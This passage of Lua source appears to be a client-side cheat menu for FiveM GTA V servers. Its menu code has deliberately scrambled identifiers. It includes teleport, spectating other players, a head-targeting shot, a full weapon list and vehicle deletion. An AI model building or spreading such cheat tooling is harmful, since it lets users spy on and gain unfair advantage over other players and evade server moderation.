gesraGSRKGoiwsrrswg = {}

gesraGSRKGoiwsrrswg.aFIgfnieasa = false
local poiytriOGRDUNIDhuthdghd = false
local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.23
local titleHeight = 0.17
local titleYOffset = 0.05
local titleScale = 1.5

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if gesraGSRKGoiwsrrswg.aFIgfnieasa then
		Citizen.Trace("[TMmenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function gesraGSRKGoiwsrrswg.afgsrgiuasbGIUSEDRg(id, title)

	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.70
	menus[id].y = 0.25

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 1
	menus[id].titleColor = {r = 255, g = 0, b = 0, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)				
				menus[id].titleBackgroundColor = {r = 83, g = 86, b = 92, a = 225}
				menus[id].menuFocusBackgroundColor = {r = 83, g = 86, b = 92, a = 255}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 250, g = 250, b = 250, a = 255}
	menus[id].menuSubTextColor = {r = 250, g = 250, b = 250, a = 255}
	menus[id].menuFocusTextColor = {r = 250, g = 250, b = 250, a = 255}
    menus[id].menuFocusBackgroundColor = {r = 83, g = 86, b = 92, a = 255 }
	menus[id].menuBackgroundColor = {r = 83, g = 86, b = 92, a = 100 }

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 50
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

	debugPrint(tostring(id) .. " menu created")
end

function gesraGSRKGoiwsrrswg.azsfAEIFGbauifag(id, parent, subTitle)
	if menus[parent] then
		gesraGSRKGoiwsrrswg.afgsrgiuasbGIUSEDRg(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function gesraGSRKGoiwsrrswg.CurrentMenu()
	return currentMenu
end

function gesraGSRKGoiwsrrswg.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function gesraGSRKGoiwsrrswg.IsMenuOpened(id)
	return isMenuVisible(id)
end

function gesraGSRKGoiwsrrswg.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function gesraGSRKGoiwsrrswg.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function gesraGSRKGoiwsrrswg.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function gesraGSRKGoiwsrrswg.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

function gesraGSRKGoiwsrrswg.MenuButton(text, id, subText)
	if menus[id] then
		if gesraGSRKGoiwsrrswg.Button(text, subText) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function gesraGSRKGoiwsrrswg.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if gesraGSRKGoiwsrrswg.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function gesraGSRKGoiwsrrswg.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end

	if gesraGSRKGoiwsrrswg.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
		
	end

	callback(currentIndex, selectedIndex)
	return false
end

function gesraGSRKGoiwsrrswg.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			gesraGSRKGoiwsrrswg.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					gesraGSRKGoiwsrrswg.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function gesraGSRKGoiwsrrswg.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function gesraGSRKGoiwsrrswg.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function gesraGSRKGoiwsrrswg.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function gesraGSRKGoiwsrrswg.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function gesraGSRKGoiwsrrswg.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function gesraGSRKGoiwsrrswg.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function gesraGSRKGoiwsrrswg.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function gesraGSRKGoiwsrrswg.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function gesraGSRKGoiwsrrswg.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function gesraGSRKGoiwsrrswg.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function gesraGSRKGoiwsrrswg.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function gesraGSRKGoiwsrrswg.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function gesraGSRKGoiwsrrswg.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers(128) do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end



local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local Enabled = true

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end

function pdocisaduafuGFNAEgg(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function uKOTUIOioTUmujjmgj(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function engine(veh)
					 SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
					


					
end

function tuapfoGOISRHIOnsag(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
